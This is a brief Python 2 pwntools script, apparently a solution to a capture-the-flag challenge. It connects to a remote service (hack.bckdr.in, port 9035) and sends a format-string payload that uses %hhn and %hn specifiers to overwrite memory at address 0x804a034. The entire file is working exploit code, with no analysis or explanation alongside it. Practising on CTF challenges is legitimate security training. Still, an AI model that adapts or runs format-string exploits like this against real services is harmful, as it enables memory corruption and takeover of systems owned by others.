from pwn import *

payload = p32(0x804a034+1)+p32(0x804a034-1)+'%57x'+'%10$hhn'+'%2681x'+'%11$hn'
#p = process('./32_new')
p = remote('hack.bckdr.in', 9035)
print p.recv()
#pause()
p.sendline(payload)
print p.recv()
print p.recv()
